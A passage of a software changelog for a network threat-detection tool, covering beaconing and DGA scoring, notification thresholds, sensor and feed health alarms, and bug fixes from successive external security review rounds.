  is now `flex: 1; min-height: 0; overflow-y: auto`. When the dock
  is dragged tall enough that the content fits, no scrollbar
  appears. When shorter, the body scrolls while the header bar,
  tabs, and action footer stay pinned. Chrome elements grew
  `flex-shrink: 0` so they don't get squashed when the pane shrinks.
- **#detail-text fills the available space.** Removed the hardcoded
  `height: 150px` cap. Pre-fix the text box was ~one inch tall
  regardless of how much room the dock had. Now it grows with its
  content and the panel's overflow handles scrolling when needed.

### Fixed

- **NEW-111: bell silently fails for findings hidden by the
  allowlist or suppressions.** Three-part fix: SetFindings now
  skips notification emit for findings whose src/dst is on the
  allowlist or in the unexpired suppression set; SetAllowlist and
  AddSuppression dismiss existing finding notifications whose
  src/dst is now hidden; the bell-jump JS shows a clear status
  message when the position endpoint reports the row is filtered
  out, instead of letting Table.jumpTo silently return -1. The
  finding's Detail still renders in the dock so the analyst can
  act on it via the persistent footer.

### Tests

- Three tests in `store_test.go` articulate the bell-gate
  invariant: notification iff the row would appear in the listing.
  Exercises both gating paths (allowlist exact, allowlist CIDR,
  suppression) and both IP roles (src, dst). Plus tests for the
  cleanup paths on SetAllowlist and AddSuppression.

## [v0.18.0] — 2026-05-12

Analyst-workflow slice. Four user-visible surfaces shipped together
because they pull on the same workflow: a new finding status, a
restructured detail dock, a chart that can be exported, and the
twenty-fourth external review round closing six findings against
the slice itself.

The motivating ask was a lightweight reversible bucket distinct
from Acknowledge — analysts wanted to clear noise from their default
view without committing to the heavier semantics of "I've reviewed
this." The Dismissed status answers that, and the surrounding work
(dedicated tab with Findings + Campaigns sub-tabs, bulk-dismiss on
campaign aggregates, default-exclude from the other tabs) makes the
new status useful in practice.

The dock redesign and chart export are parallel tracks that landed
in the same window — the dock turns the detail pane into a tabbed
surface (Detail / Notes / TI Results) with collapse persistence and
keyboard shortcuts; the chart gets an expand-to-modal button and
client-side PNG/JPEG export. None of it requires a server roundtrip;
the chart export is pure SVG → canvas → toDataURL.

The audit on top closed six items. NEW-105 through NEW-110: var()
fallback parsing in the chart export, dock auto-expand overwriting
persisted preference, "Dismiss campaign" label being overwritten by
a downstream pass, a missing contract test for the "TI Enrichment"
author literal, a misleading aspect-ratio CSS rule on the modal SVG,
and an HRS-vs-dismissed design question resolved in code comment.
Pattern: integration points between independently-correct components.

### Added

- **Dismissed finding status.** Fourth status value alongside Open,
  Acknowledged, Escalated. The store and PATCH validator accept it;
  filterFindings excludes dismissed by default unless either the
  request explicitly filters on status=dismissed or passes
  include_dismissed=true. Reversible via the same Un-dismiss action
  surfaced in the context menu when the row is currently dismissed.
- **Dismissed tab with Findings + Campaigns sub-tabs.** Top-level tab
  shows dismissed findings; the Campaigns sub-tab rolls them up by
  (dst, port). Hosts is intentionally excluded — bulk-dismissing a
  source IP's findings would erase the host's risk story.
- **Bulk-dismiss on Campaigns rows.** Right-click on a Campaigns
  aggregate offers "Dismiss campaign" — best-effort PATCH loop
  across every open finding in the campaign with a shared note.
  Status reports partial success when the loop returns mixed results.
- **Tabbed findings dock.** Detail / Notes / TI Results tabs replace
  the single-pane detail. Notes partition on the author literal
  "TI Enrichment" so TI cross-annotation surfaces in its own tab.
  Tab badges show counts; last-used tab persists; 1/2/3 keyboard
  shortcuts flip tabs when focus isn't in an input.
- **Dock collapse with persisted preference.** Toggle button hides
  the dock body so the table claims the vertical space. Row clicks
  auto-expand without overwriting the persisted "I want this
  collapsed" preference.
- **Beacon evolution chart expand-to-modal + image export.** Click
  the chart to open in a modal at a larger size; export to PNG or
  JPEG via the modal's action footer. Pure client-side serialize →
  canvas → toDataURL; no new server endpoint.

### Detection changes

- **Host Risk Score continues to include dismissed findings.** This
  is a deliberate semantic choice documented in `aggregateRisk`:
  Dismiss is a lightweight reversible view-state bucket, not a
  "false-positive, drop it" verdict. Excluding dismissed from HRS
  would put load-bearing weight on a one-click reversible action.
  Analysts who want a detection to stop influencing risk should add
  it to the allowlist or suppression surfaces.

### Fixed

- **NEW-105: beacon chart export silently dropped the data-size
  line.** The var() resolver in beacon_evolution.js parsed
  `var(--accent-alt, #6bb6ff)` as the variable name
  `--accent-alt, #6bb6ff` (looking at the first close-paren rather
  than the var name boundary), couldn't resolve it, and left the
  original var() reference in the serialized SVG where the off-DOM
  canvas render strokes it as transparent. Parser now splits on the
  first comma and falls back to the literal fallback value.
- **NEW-106: dock auto-expand overwrote the operator's persisted
  collapse preference.** Every row click called `_setDockCollapsed(false)`
  which unconditionally wrote to localStorage. The operator's
  explicit "collapse this dock" preference was destroyed by the
  next row inspection. `_setDockCollapsed` grew a persist parameter
  defaulting to true; the auto-expand passes false.
- **NEW-107: "Dismiss campaign" context-menu label was overwritten
  to "Dismiss".** A downstream status-aware label rewrite ran
  unconditionally on every row, including Campaigns aggregates
  (which have no status). The campaign-aware label set earlier in
  the flow was destroyed. The rewrite now skips campaign aggregates.

### Tests

- **NEW-108: contract test for the "TI Enrichment" author literal.**
  The SPA partitions notes into the TI Results tab by exact-match
  on author === "TI Enrichment". The Go side hardcodes the same
  string in three sites. Test scans all four locations to lock the
  cross-language convention. Same shape as NEW-74's spectral-rescue
  marker test.

### Documentation

- **NEW-109: dropped misleading aspect-ratio: 9/4 CSS on the modal
  beacon chart.** The SVG's viewBox is 3:1; the CSS rule forced a
  9:4 container that the chart letterboxed inside via the default
  preserveAspectRatio. Cosmetic, but the rule advertised an
  aspect ratio the chart wasn't using. With the CSS gone, the modal
  renders the chart at its true ratio.
- **NEW-110: aggregateRisk now documents the HRS-vs-dismissed
  semantic.** Inline comment explains why Status filtering is
  deliberately absent — see Detection changes section above.

## [v0.17.1] — 2026-05-12

Twenty-third external review round, first post-v0.17.0. Seven
items: two Mediums (NEW-98 notifications-not-persisted and NEW-99
bell-threshold-over-corrected, both load-bearing for v0.17.0's
notification-hygiene story), one Medium documentation correction
(NEW-100 external-monitoring framing), three Lows (NEW-101 UTF-8
truncate, NEW-103 SSE-open reset, NEW-104 re-enrollment lifecycle),
and one deferred (NEW-102 rsync-failed-checkin-alive design).

The pattern this round: v0.17.0's structural code (dedup pattern,
SQL CASE, SSE plumbing) was right; the operational details (where
exactly to set the threshold, what survives a restart, what counts
as "external monitoring") had rough edges. The audit framing was
crisp: "shallow polish on top of correct deep work." The cheap
fixes here close most of the remaining gap.

Two durable lessons surfaced and were saved to memory:

- *Calibration thresholds are global + documented in code, not
  per-deployment Settings.* When picking a calibration value
  (bell threshold, scoring weight), pick a value defensible by
  external reasoning, document the choice with the reasoning,
  iterate based on operator-observation data. Don't expose as a
  Settings toggle (breaks cross-deployment incident discussion);
  don't bump discrete-tier scores to clear a threshold (score
  field has too many consumers).
- *Finding.Score carries two semantics simultaneously.* Continuous
  evidence axis (Beaconing, Correlated Activity, DGA-bumped) vs
  discrete severity-tier label (TI Hit, Malicious JA3, URI
  patterns). Any cross-type comparison must consider both
  populations; single-threshold gates conflate the two and produce
  surprising results.

### Breaking

- **Bell threshold semantics changed.** The v0.17.0 gate of
  `Score >= 99` is replaced with `Score >= 95`. This is more
  permissive than v0.17.0 (which over-corrected) but tighter than
  pre-v0.17.0 (which fired for CRITICAL severity or any TI type).
  Operators who calibrated against the v0.17.0 threshold should
  expect more bell rings, but only from detectors that score 95-98
  — primarily URLhaus / FeodoTracker / Malicious JA3.

### Bell tier enumeration (NEW-99 lock-in)

The threshold enumerates which detector outputs ring at v0.17.1.
The enumeration locks the contract so a future detector score
change can't silently shift bell semantics.

**Rings the bell** (score >= 95, IsNew, not Host Risk Score):

| Detector | Score | Source |
|----------|-------|--------|
| Suspicious URL (URLhaus host match) | 96 | `internal/analysis/ti.go` |
| TI Hit (IP) — FeodoTracker / URLhaus | 96-97 | `internal/analysis/ti.go` |
| Malicious JA3 | 95 | `internal/analysis/ssl.go` |
| Beaconing — DGA-bumped | up to 99 | `internal/analysis/dga.go` |
| HTTP Beaconing — DGA-bumped | up to 99 | `internal/analysis/dga.go` |
| Correlated Activity — multi-type stacks | up to 99 | `internal/analysis/correlate.go` |
| Computed Beaconing / HTTP Beaconing | when ≥ 95 | `internal/analysis/conn.go`, `http_analysis.go` |

**Does not ring** (in panel, but no bell — score below threshold or
type excluded):

| Detector | Score | Reason |
|----------|-------|--------|
| Cobalt Strike URI | 93 | Pattern-match, no externally-validated audit trail |
| Zeek Notice (attack) | 92 | Zeek-derived; passthrough quality varies |
| C2 URI Pattern | 91 | Pattern-match, broader false-positive surface |
| MISP / OpenCTI broad match | 90 | Tier-3 confidence — feed-aggregator hits |
| File hash hit | 90 | Tier-3 confidence — hash matches alone |
| Host Risk Score | any | Roll-up, not a discrete event (excluded by type) |

If a future detector change shifts a score across the threshold,
update this enumeration in the same commit.

### Fixed

- **NEW-98 (Major): Notifications now survive server restart.**
  Migration 0014 adds the `notifications` table mirroring the
  `model.Notification` fields plus `created_at`. AddAlarm + the
  SetFindings bell loop persist on emit; DismissNotification +
  DismissAllNotifications persist the dismissed flag. InitDB
  rehydrates on boot and seeds `notifCounter` from `MAX(id)` so
  post-restart emissions can't collide with persisted rows. Pre-
  fix, every active alarm (finding bell entries, sensor heartbeat
  alarms, feed unhealthy alarms) was wiped on any redeploy — the
  operator's last surface for "what alerted today" disappeared
  with each restart. Same shape as NEW-72's fix for in-memory
  Correlations.
- **NEW-99 (Major): Bell threshold re-calibrated from
  `Score >= 99` to `Score >= 95`.** v0.17.0's 99 gate over-
  corrected — discrete-tier detectors top out below 99 by design,
  so externally-validated high-confidence indicators (URLhaus,
  Malicious JA3, FeodoTracker) stayed silent. 95 captures the top
  of both the discrete-tier population AND the computed-score
  population. Detector-by-detector outcome is enumerated above.
- **NEW-100 (Documentation correction): "External monitoring"
  framing retracted from `/api/sensors/health`.** The endpoint
  requires session-cookie auth; Prometheus/Nagios scrape tooling
  can't consume it directly today. README, API.md, and OPERATIONS
  now describe it as for in-auth-boundary consumers (analyst-
  facing dashboard tiles, IR triage shell helpers). A first-class
  service-account-token surface for external monitoring is a
  v0.18.x candidate.
- **NEW-101 (Low): `truncate` in feed_health.go respects UTF-8
  rune boundaries.** Pre-fix `s[:n]` could land mid-multi-byte
  sequence, emitting invalid UTF-8 that the SPA rendered as the
  Unicode replacement glyph. Walks back to the nearest rune start
  via `utf8.RuneStart` before cutting. Regression test sweeps cap
  values across a string containing em-dashes and confirms
  `utf8.ValidString` on every result.
- **NEW-103 (Low): Watch heartbeat tracker treats SSE `open` as
  proof-of-life.** Pre-fix a brief SSE disconnect-and-reconnect
  left the dot stale for up to one heartbeat interval (60s)
  before the next server-side tick arrived. Subscribing to the
  `open` event resets `lastBeat` so the dot flips back to healthy
  as soon as the connection itself recovers.
- **NEW-104 (Low): OPERATIONS documents re-enrollment lifecycle
  for stale log directories.** The sensor heartbeat
  `max(LastSeenAt, lastLogMTime)` check false-positives when a
  sensor is re-enrolled under a name whose `/data/logs/<name>/`
  directory still exists. Mitigation: clear the log directory
  before re-enroll, or use Purge (which clears logs) rather than
  plain Disenroll.

### Deferred

- **NEW-102: Rsync-failed-but-checkin-alive alarm.** The current
  `max(LastSeenAt, lastLogMTime)` check correctly handles "rsync
  alive, HMAC checkin broken" but silently misses the inverse
  (HMAC firing hourly while rsync has stopped). A separate alarm
  when `LastSeenAt - lastLogMTime > N` would close this gap;
  needs design conversation and operator-observation data to
  calibrate. Carried in TODO §3.

## [v0.17.0] — 2026-05-12

Notification hygiene + operator visibility slice. Four changes
that together address the operator's pain point with the bell:
firing on every CRITICAL/TI finding meant analysts learned to
ignore it, and the conditions that genuinely demand attention —
a sensor dying, a feed silently failing, the SSE pipe wedging —
had no surface at all. The bell is now reserved for top-tier
finding confidence (score >= 99) and the three operational
alarms ride alongside it.

### Breaking

- **DB schema (minor bump pre-1.0).** Migration `0013` adds
  `consecutive_failures INTEGER NOT NULL DEFAULT 0` to `feeds`.
  Forward-only; existing rows pick up the default automatically.
- **Bell semantics changed.** The previous gate
  (`Severity == CRITICAL || IsThreatIntelType`) fired for any
  score ≥ 80 and every TI hit. The new gate is `Score >= 99`.
  Operators who relied on the bell as a HIGH-confidence flag
  will see significantly fewer notifications; the existing
  notification panel and `/api/notifications` endpoint shape
  is unchanged (the `Notification` JSON gains `kind`, `target`,
  and `detail` fields, all optional with documented defaults).

### Added

- **Bell threshold gated at score >= 99.** Detection findings
  ring the bell only when they hit the top-tier confidence
  bucket. Host Risk Score is still excluded as before (rollup,
  not a discrete event).
- **`Notification` model now carries `Kind`, `Target`, `Detail`.**
  Kind disambiguates the bell entry (`"finding"`, `"sensor"`,
  `"feed"`; empty reads as `"finding"` for backward compat).
  Target is the sensor or feed name for non-finding alarms;
  Detail is the human-readable description the panel renders
  under the type/severity line.
- **Sensor heartbeat alarm.** A new periodic loop watches every
  enrolled sensor's `last_seen_at` (and on-disk rsync mtime,
  the latest of the two). Crossing 2h without a signal emits
  a `Kind=sensor` notification ("Sensor lab-1 hasn't checked
  in for 2h 15m"). Transition-edge dedup: one alarm per
  staleness episode, cleared automatically when the sensor
  checks in again. Disenrolled sensors and never-reported
  sensors are skipped.
- **`GET /api/sensors/health`.** External-monitoring endpoint
  returning per-sensor staleness state (`name`, `last_seen_at`,
  `stale`, `stale_for_seconds`, `stale_threshold_sec`). Same
  threshold the bell uses, so Prometheus/Nagios checks and the
  operator's bell stay in sync.
- **Feed reliability alarm.** Two unhealthy criteria emit a
  `Kind=feed` notification: `consecutive_failures >= 3` (the
  refresh worker bumps the counter on every "error" cycle and
  resets it on every "ok" cycle via SQL CASE so concurrent
  refreshes don't race) OR `last_refresh_at` > 24h ago
  (catches the case where the refresh path itself isn't
  running). Disabled feeds are skipped.
- **Watch heartbeat SSE tick.** The server publishes
  `watch.heartbeat` every 60s. A small dot in the top bar
  flips green/red based on the most recent beat; 180s without
  a tick flips red ("watch is dead and quiet" vs "watch is
  healthy and quiet"). Ticks unconditionally — proves the SSE
  pipeline is alive even when watch is configured off.
- **Bell jump dispatches by `Kind`.** Sensor alarms open the
  Sensors modal; feed alarms open the Feeds modal; finding
  alarms run the existing jump-to-row logic. Both modules
  expose a small `open()` helper.

### Changed

- `UpdateFeedRefreshState` writes `consecutive_failures` via
  CASE on `status` ('ok' → 0, 'error' → +1, else unchanged).
- `Notification` JSON payload gained `kind`/`target`/`detail`
  fields; consumers that don't recognise them ignore them
  harmlessly.

## [v0.16.5] — 2026-05-12

Twenty-second external review round, first post-v0.16.4. Two
findings, both Major, both in the cross-detector correlation
plumbing. The pattern this round repeats the v0.15.1 / v0.16.4
lesson: a fix that ships with a passing test against the narrow
case it observed can leave half the contract un-validated. The
v0.16.4 NEW-92 fix routed dedup through fingerprint correctly,
but in choosing which ID to keep when the same fingerprint
appeared in both passes it stored an ID the downstream annotation
apply pass couldn't look up — silently clearing every this-run
contributor's Correlations whenever it had a historical
fingerprint-twin. The audit's framing: the contract is
"every this-run participant gets its Correlations populated,
regardless of historical co-firers" — the prior test asserted
that contract on the no-historical-twin shape only.

Both regressions ship with invariant-shaped tests that exercise
multiple input shapes against the same code path (per the
[memory note](../../../.claude/projects/-root-Archer/memory/feedback_test_invariant_not_failure_case.md)),
not just the narrow failure case the auditor described.

### Fixed

- **NEW-96 (Major): correlate.go silently cleared this-run
  contributors' Correlations when a historical fingerprint-twin
  also fired.** NEW-92's fingerprint-dedup chose to override
  fresh IDs with historical IDs in the `idsByFingerprint` map,
  on the reasoning that persisted IDs survive `SetFindings`
  unchanged. The annotation apply pass at the bottom of
  `correlateFindings`, however, keys map lookups on
  `a.findings[i].ID` — the FRESH ID for this-run findings. When
  a fingerprint had both fresh and historical contributors, the
  map's key was the historical persisted ID, the lookup under
  the fresh ID returned nil, and the apply pass fell through to
  the "doesn't participate this run" branch (case 3) and
  cleared the slice to nil. Asymmetric result: the Correlated
  Activity row listed Beaconing as a contributor while the
  Beaconing finding itself claimed no correlations; the chip
  count on the contributor row read "+0". Fix: invert the
  dedup choice — first-seen wins, and iteration order
  (`a.findings` before `findingsProvider`) means fresh IDs win.
  NEW-91's identity-map path translates either ID space
  correctly downstream, so preferring fresh costs nothing for
  correctness and is the only choice that makes the annotation
  pass find its entries. Regression test asserts the invariant
  ("every this-run participant retains its Correlations
  regardless of whether a historical twin fingerprint also
  contributes") on the historical-twin shape that broke
  pre-fix.
- **NEW-97 (Major): JSON import silently dropped every
  Correlations reference between imported findings.** The
  import handler (`handleImportJSON`) reassigns every imported
  finding's `ID` to `i+1` so the new store has a clean
  sequential ID space. Pre-fix the `Correlations` slices were
  left untouched, still referencing the exporter's old IDs.
  SetFindings's NEW-91 translation looks up each ID in
  `freshToPersisted` (built from this-run fresh IDs, which are
  now 1..N) then `historicalIDs` (the pre-import store, empty
  on a fresh import target). Neither matched, every reference
  dropped silently — exporting and re-importing a finding set
  lost the entire correlation graph. Fix: build an `oldToNew`
  map during the ID reassignment pass and translate every
  `Correlations` slice through it before calling SetFindings.
  Regression test asserts the invariant ("every Correlations
  reference between imported findings survives the rewrite")
  across three shapes in one payload — contributor→sibling,
  contributor→correlation row, and correlation row→contributors.

## [v0.16.4] — 2026-05-12

Twenty-first external review round, first post-v0.16.3. Three
findings actioned, one acknowledged-but-deferred. The major item
(NEW-91) is a continuation of NEW-71's institutional lesson:
when fixing a bug, write the regression test against the
end-to-end invariant the fix is supposed to enforce, not against
the narrow failure case you noticed. v0.15.1 closed NEW-71's
fresh-ID translation case but missed the historical-contributor
path — a real bug that surfaced in steady-state operation,
silently dropping every cross-run correlation reference.

The discipline lesson lives [in
memory](../../../.claude/projects/-root-Archer/memory/feedback_test_invariant_not_failure_case.md)
so the next fix that ships with a passing test against the
narrow case gets caught at write time.

### Fixed

- **NEW-91 (Major): Correlations referencing historical
  contributors were silently dropped by SetFindings's
  translation.** `correlate.go`'s historical-union path
  (consults `findingsProvider` when `Phase 3.5` runs) puts
  persisted IDs into this-run findings' `Correlations` slices
  directly — the cross-run sibling references the chip is
  supposed to surface. Pre-fix `SetFindings`'s NEW-71
  translation looked up every ID in `freshToPersisted`;
  historical persisted IDs aren't keys in that map (they're
  values), so each one was silently dropped or mis-mapped to
  an unrelated finding's persisted ID.
  Worked example: Run 1 emits Beaconing (persisted ID 47) +
  DNS Tunneling (persisted ID 92) + Correlated Activity (200).
  Run 2 emits only Beaconing. correlate.go reads Beaconing
  from `a.findings` (fresh ID 5) + DNS Tunneling from
  `findingsProvider` (persisted ID 92) and emits Correlated
  Activity with `Correlations=[5, 92]`. Pre-fix translation:
  92 not in freshToPersisted → dropped. Result: `[bcn]`
  (DNS reference lost). Post-fix: `historicalIDs` set built
  from `s.findings` before translation gives 92 a pass-through
  path → result `[bcn, dns]`.
  Known limitation (case B2 in the audit notes): when a fresh
  per-run ID happens to numerically equal a historical
  persisted ID, the disambiguation is ambiguous and
  freshToPersisted wins. Realistic only in fresh deployments
  where the ID ranges overlap; mature deployments with
  thousands of historical findings see persisted IDs well
  above the fresh range.
- **NEW-92: correlate.go dedup now keys on fingerprint, not
  ID.** Same logical finding can appear in `pd.findingIDs`
  twice — once with fresh ID (from `a.findings`) and once with
  persisted ID (from `findingsProvider`). Pre-fix `idsByID`
  dedup keyed on `f.ID`, which is wrong because the same
  finding has two different IDs across the two sources.
  Replaced with `idsByFingerprint map[model.Fingerprint]int`
  where the historical pass overrides the fresh pass — the
  chosen ID is the already-persisted one, which survives
  SetFindings unchanged via NEW-91's identity-map path.
- **NEW-94: doc drift in `TestDGAScore_KnownDGANames` comment.**
  Comment claimed threshold `bigramLLH < -3.0` but the test
  body and shipped default both use `-4.5`. Updated comment
  to match. Same shape as NEW-79 (the production `bigramFloor`
  comment) but in test code.

### Acknowledged (not fixed)

- **NEW-95: prune-loop pattern inconsistency.** Three TTL
  entities exist today (`unauthorized_attempts`,
  `suppressions`, `beacon_history`) with two prune patterns
  (dedicated goroutine vs. coupling to another lifecycle —
  the latter caused NEW-86). Session prune (NEW-69) is
  unimplemented. The auditor recommends a `startPruneLoop`
  helper to consolidate. Punted to a later release as a pure
  refactor without an active failure mode — the v0.16.3
  NEW-86 fix already corrected the actual bug; helper
  consolidation is hygiene.

## [v0.16.3] — 2026-05-12

Twentieth external review round. Five findings: three Mediums
addressed in this release, one Low documented, one Low
acknowledged as deferred-by-design. None critical.

The pattern this round is "v0.16.0/v0.16.1 introduced the
infrastructure for beacon history; this release closes the gaps
between what the schema can support and what the operator
actually sees." NEW-87 in particular: the dual-column
(max_score, last_score) UPSERT design from NEW-76 was already
producing data, but the chart only rendered one of them — the
analyst couldn't see the spike-vs-current distinction the schema
was specifically built to surface. The hover tooltip closes the
loop without re-opening a design conversation.

### Fixed

- **NEW-86: beacon_history retention silently broken when watch
  is disabled.** `PurgeBeaconHistory()` was wired only from the
  watch loop's first-tick-of-UTC-day branch, so deployments
  running Archer in manual-analysis-only mode never swept
  history rows and accumulated them indefinitely.
  `startBeaconHistoryPruneLoop` is now a dedicated daily goroutine
  matching the pattern `startSuppressionsPruneLoop` /
  `startUnauthorizedPruneLoop` already use — fires once at boot
  (catches up a long-stopped instance) and every 24h thereafter,
  unconditional on watch config. The watch-loop caller is removed
  to avoid duplicate work.
- **NEW-87: chart now surfaces last_score / max_score_at /
  last_score_at via SVG tooltip.** The NEW-76 schema added these
  columns specifically so a beacon that spiked at noon and fell
  back by evening renders as "Max: 88 (peaked 14:23) / Last: 60
  (most recent 18:00)" rather than just "Score: 60." v0.16.2
  shipped the schema but the chart didn't read the new fields.
  Each daily data point now carries a `<title>` element with
  Max, Last (when different from Max), the two timestamps, and
  the four sub-axis values. Native browser tooltip, no JS event
  wiring. Tooltip uses local time (HH:MM) for the timestamps;
  legacy backfilled rows with `*_at=0` render as `—`.
- **NEW-88: BeaconHistory read query now caps at the retention
  window.** `WHERE day_utc >= (now - BeaconHistoryRetentionDays)`
  is defense-in-depth against three failure modes: (a) purge
  hasn't run yet on a fresh boot, (b) a future operator promotes
  retention to a longer window while the chart still expects 30
  days, (c) a malformed manual SQL insert at an extreme date
  distorts the chart's x-axis scale. Regression test asserts a
  row 30+ days outside the window is clipped from the response
  even when physically present in the table.

### Documented (not fixed)

- **NEW-89: Finding sub-score lifecycle.** `TSScore` / `DSScore`
  / `HistScore` / `DurScore` are populated only at emit time and
  not persisted to the `findings` table. Preserved-historical
  findings have zero sub-scores after a server restart. No
  current consumer reads them outside the
  emit → `saveBeaconHistory` critical section, but a future
  consumer (sub-axis filtering, detail-pane breakdown UI) would
  see stale zeros for historical findings. Documented the
  lifecycle invariant in `model/finding.go` so the bug-in-waiting
  is named; add migration 0013 with four REAL columns the first
  time a feature requires the persistence.
- **NEW-90: spectral diagnostics not in beacon_history schema.**
  Beaconing findings record `spectral_rescued` / `spectral_period`
  / `spectral_power` in the Detail string but not as structured
  beacon_history columns. The chart can't render "this beacon
  started getting spectral-rescued on day 5." Deferred to a
  future schema bump — when migration 0013 is justified by
  NEW-89 (sub-score persistence) or another consumer, bundle
  the spectral columns into the same migration.

## [v0.16.2] — 2026-05-11

Nineteenth external review round, first post-v0.16.1. Five
findings: one real bug, three defensive tightenings, one
documented edge case. The auditor's structural assessment was
that the code is now in "defensible design vs could be tightened"
territory — failures found are at the boundary, not in the core.

The real bug (NEW-81) is mine to own: the hand-rolled
`isIPLiteral` classifier I shipped in v0.16.1 returned `true`
for any string composed of hex characters plus dots/colons.
That's a false-positive on all-hex hostnames like `face.beef`
or `cafe.dead`, which makes `applyDGAScoring` skip them. The
paradoxical attack vector: a DGA author could craft an all-hex
domain to *evade* the IP-literal filter and (because the filter
skips them) get the DGA bump suppressed. Same shape of defense
the wire-up was supposed to provide, broken by the classifier
itself. `net.ParseIP` is the right tool and was always available
— the hand-rolled heuristic was over-engineering with a real bug
inside it.

### Fixed

- **NEW-81: `isIPLiteral` mis-classifies all-hex hostnames as IPs.**
  v0.16.1's hand-rolled classifier returned `true` for any string
  with no non-hex letters plus `.` or `:`. False-positives:
  `face.beef`, `abc.def`, `cafe.dead`, `dead.beef.cafe.babe`.
  Replaced with `net.ParseIP`-based check that handles bare IPv4
  / IPv6, IPv4-with-port (`1.2.3.4:443`), and bracketed-IPv6-with-
  port (`[::1]:443`). Regression cases added to `TestIsIPLiteral`
  for the four all-hex hostnames + the two bracketed-IPv6 forms.
- **NEW-83: defensive `isIPLiteral` at `dgaHostnameScore` entry.**
  `applyDGAScoring` filters IP literals before calling
  `dgaHostnameScore`, but the package-internal function is
  callable directly without that filter — a future caller
  bypassing applyDGAScoring would hit `extractSLD("2001:db8::1")`
  → `"2001"` as a meaningless SLD. The guard is now at the
  function entry where the consequence happens. Same NEW-66 /
  NEW-77 pattern: enforce invariants at the point of use.
- **NEW-85: `BeaconHistoryKey` collision via crafted `\x1f` input.**
  A compromised sensor could craft an HTTP Host header containing
  the literal Unit Separator byte and produce a key that collides
  with another beacon's key (e.g. `Hostname="evil.com\x1fa", URI="/b"`
  collides with `Hostname="evil.com", URI="a\x1f/b"`). Threat
  model already accepts compromised-sensor data, but the cost of
  defense is one `strings.ContainsRune` per field — the
  `scrubSeparator` helper replaces `\x1f` with `\x1e` (Record
  Separator) on the rare contains-path; the normal path
  short-circuits. Regression test asserts the colliding pair
  produces distinct keys post-scrub.
- **NEW-82: `BeaconHistoryRetentionDays` exported, watch.go uses it.**
  `watch.go` formatted the purge status line with a hard-coded
  `30`; the constant of the same value lived as
  `beaconHistoryRetentionDays`. Same doc-vs-code drift shape as
  v0.16.1 NEW-79 but for retention. Constant exported (capital R),
  callers reference one source of truth. Set-up for future
  promotion to `config.Config`.

### Known edge cases (documented, not fixed)

- **NEW-84: UPSERT severity-update misses equal-score severity
  bumps.** The `severity = CASE WHEN excluded.max_score > max_score
  THEN ...` branch fires only on strict score increase. When a
  beacon already at score 99 has its severity bumped a step by
  the DGA augmentation in a later same-day pass (one-step severity
  upgrade applies even at score-cap 99), the history row keeps
  the earlier pass's severity. Realistic but rare — requires two
  same-day passes both producing the same numeric max with
  different severities. Documented in `saveBeaconHistory` with
  the rationale for not restructuring yet; will revisit if
  operators see it in practice.

## [v0.16.1] — 2026-05-11

Eighteenth external review round, first post-v0.16.0. Four
findings (the auditor retracted a fifth after rechecking
existing test coverage). One is a design correction on the
beacon_history table I should have made before v0.16.0 merge
— the auditor flagged it on a prior round and I shipped through
the pushback with a comment that wasn't true. The other three
are small (one dead-code wire-up, two hygiene fixes).

The institutional pattern worth naming: when a comment claims a
design is "deliberate," the supporting reasoning has to be
technically correct. The v0.16.0 beacon_history comment
justified `INSERT … ON CONFLICT DO NOTHING` by saying "the
morning pass is the more representative score because it sees
the day's earlier logs" — both halves of that reasoning were
factually wrong about how the beacon detector works. The
audit-trail discipline isn't "ship the version the reviewer
wanted" — it's "the codebase shouldn't claim a thing that isn't
true."

### Fixed

- **NEW-76 (Major): beacon_history `DO NOTHING` silently dropped
  mid-day score shifts.** v0.16.0 shipped with
  `INSERT … ON CONFLICT DO NOTHING` plus a comment claiming the
  morning's snapshot was "the more representative score." The
  reasoning was wrong (the analyzer scores against an
  accumulated reservoir window, not "today's logs"), and the
  resulting silent-drop hid the adversarial pattern the
  evolution chart is supposed to surface: a C2 operator tunes
  dwell mid-day, score climbs 75 → 88, falls back to 60 by
  evening — pre-NEW-76 the 88 spike disappeared from history
  forever, with only the morning 75 surviving. Manifests under
  any sub-daily watch cadence (`WatchIntervalHours = 1/4/6/12`)
  or admin-triggered re-analysis. Migration 0012 renames `score`
  → `max_score` and adds `max_score_at` / `last_score` /
  `last_score_at`; INSERT becomes UPSERT with max_* updated
  conditionally and last_* updated always. The SPA chart now
  renders `max_score` (the trajectory-meaningful number).
  Regression test asserts the three-write scenario (morning 60
  → noon spike 88 → evening fallback 50) leaves
  `max_score=88, last_score=50`.
- **NEW-77: `isIPLiteral` was dead code with a load-bearing
  docstring.** The function existed in `dga.go` with a comment
  saying "DGA scorer should never run against IP literals," but
  no caller invoked it. The applyDGAScoring loop now consults
  it right after the empty-Hostname guard so SNI / Host-header
  IP literals (some malware deliberately sets SNI to an IP to
  bypass naive DPI) short-circuit before extractSLD turns a
  meaningless octet into a score input. Regression test
  `TestIsIPLiteral` covers the classifier; `TestApplyDGAScoring_
  SkipsIPLiteralHostnames` covers the wire-up.
- **NEW-79: `bigramFloor` comment claimed the default threshold
  was -4.0; shipped default is -4.5.** Doc-vs-code drift bug.
  Updated comment to match the shipped default and explain the
  1-unit gap between English-typical bigram averages and the
  threshold.
- **NEW-80: web_esc test floor tightened from 6 to 8.** The
  `_esc` cross-module consistency test asserted "at least 6"
  SPA modules contained `_esc`; we ship 8. Tightened so a
  regression that drops `_esc` from a single module fails
  immediately rather than waiting for two more modules to also
  lose theirs.

## [v0.16.0] — 2026-05-11

Detection-depth release. Two new layers on the Beaconing and HTTP
Beaconing detectors: DGA hostname augmentation that bumps the
score on algorithmically-shaped destination names, and a 30-day
score evolution history chart in the finding detail pane. Neither
detector adds new finding types — both make the existing Beaconing
output more triage-actionable.

### Added

- **DGA hostname augmentation on Beaconing / HTTP Beaconing.** New
  `internal/analysis/dga.go` runs a post-Phase-2 sweep over emitted
  Beaconing and HTTP Beaconing findings and bumps the score
  (+15, capped at 99) and severity (one step up) when the
  destination Hostname's SLD has high Shannon entropy AND low
  English-bigram log-likelihood — the two-metric agreement keeps
  false positives manageable on legitimate algorithmic-looking
  hostnames (cache keys, blob storage IDs, ad endpoints).
  Hostname is populated at emit time from TLS SNI (conn beacons,
  via `sslUIDIndex`) and from the HTTP Host header (HTTP
  beacons). Diagnostic tag in the Detail line shows SLD, entropy,
  and bigram values so analysts can calibrate without re-running.
  Built-in CDN suffix allowlist short-circuits the obvious false
  positives (cloudfront, azure, akamai, fastly, github.io,
  etc.); operator allowlist (`Store.AllowlistMatcher`) layers on
  top.
- **DGA Settings UI.** `Settings → Beaconing` gains a "DGA scoring
